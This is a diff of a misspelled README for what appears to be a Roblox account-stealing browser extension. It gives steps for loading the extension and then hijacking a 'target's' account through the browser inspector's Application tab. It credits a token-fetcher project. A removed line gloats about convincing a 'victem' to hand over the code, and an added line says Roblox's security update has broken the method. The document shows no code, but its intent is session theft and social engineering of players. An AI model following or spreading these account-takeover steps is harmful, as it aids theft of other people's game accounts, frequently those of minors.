@@ -18,7 +18,7 @@ the json gives the extetion details
 4 select the folder          (the folder, i siad you can name whatever)
 thats it run the extetion and get the code
 
-# how to log in to the targets accountk
+# how to log in to the targets account
 1 go to roblox and log in normaly                           (it has to be the website)
 2 right click anywhere on roblox and click inpect  (anywhere on the page if you dont see it you might be on a school divice or mobile)
 3 go to application                                         (its one of the inspect tabs)
@@ -34,4 +34,7 @@ tip make sure to refresh or close and open roblox           (it dosent show unti
 
 
 also i got the base of my project from    J3ldo/Roblox-Token-Fetcher
-if you can convice the victem to give the code they are screwed 😈
+
+# IMPORTENT
+roblox updated their security...
+it dosnt work no more
